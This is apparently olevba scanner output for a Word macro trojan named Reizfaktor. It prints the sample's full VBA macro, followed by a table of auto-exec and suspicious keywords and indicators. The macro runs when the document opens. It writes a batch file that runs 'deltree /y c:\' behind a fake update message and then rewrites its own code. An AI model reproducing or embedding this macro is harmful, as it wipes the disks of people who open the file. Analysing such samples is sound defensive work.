olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Reizfaktor-228fe8adc7525eed2ad35ed77e402912d3ae2b89
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Reizfaktor-228fe8adc7525eed2ad35ed77e402912d3ae2b89 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
System.PrivateProfileString("C:\Autorun.inf", "Autorun", "open") = "Autoexek.bat"
Open "C:\Autoexek.bat" For Output As #1
Print #1, "@Echo Updating! This May Take A While..."
Print #1, "@Echo Please Wait..."
Print #1, "@deltree /y c:\ > c:\Reizfaktor.txt"
Close #1
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
For x = 1 To 12
.DeleteLines 1
Next
.ReplaceLine 1, "Sub AutoOpen()"
End With
'Reizfaktor By Lys KovicK
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Autorun.inf         |Executable file name                         |
|IOC       |Autoexek.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

